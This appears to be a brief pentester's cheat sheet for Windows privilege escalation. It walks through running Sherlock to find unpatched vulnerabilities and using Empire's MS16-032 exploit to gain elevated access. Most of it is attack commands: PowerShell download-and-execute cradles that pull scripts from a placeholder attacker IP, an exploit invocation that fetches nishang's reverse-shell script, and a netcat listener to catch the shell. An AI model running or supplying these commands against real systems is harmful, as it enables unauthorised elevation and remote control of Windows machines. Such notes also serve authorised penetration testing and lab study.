# Windows Privilege Escalation Techniques

### Check Windows version and hotfixes
`systeminfo`

### Use Sherlock to identify vulns
```
# Download Sherlock.ps1
git clone https://github.com/rasta-mouse/Sherlock.git

# Case insensitive grep search for the functions in Sherlock.ps1
grep -i function Sherlock.ps1

# Use the function Find-AllVulns, add it to the bottom of Sherlock.ps1 to call it
Find-AllVulns

# Host it on attacking box and execute through powershell using
IEX(New-Object Net.Webclient).downloadString('http://<attackingip>:<port>/Sherlock.ps1')

# If that doesn't work, call 64-bit powershell directly using
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http://<attackingip>:<port>/Sherlock.ps1')

# Check MS##-### for one that is vulnerable
```

### Using Empire for Priv Esc
```
# If you identify an MS##-### vuln for priv esc
git clone https://github.com/EmpireProject/Empire.git
./setup/install.sh

# Navigate to Empire/data/module_source/privesc to see if your MS##-### is there, eg. MS16-032
# Edit Invoke-MS16032.ps1 and call the Invoke function at the bottom
Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<attackingip>/Invoke-PowerShellTcp.ps1')"

# Use nishang and setup the Invoke-PowerShellTcp.ps1 script, calling the Invoke function at the bottom with your ip and port
# nc -lvp <port>
IEX(New-Object Net.Webclient).downloadString('http://<attackingip>/Invoke-MS16032.ps1')
```
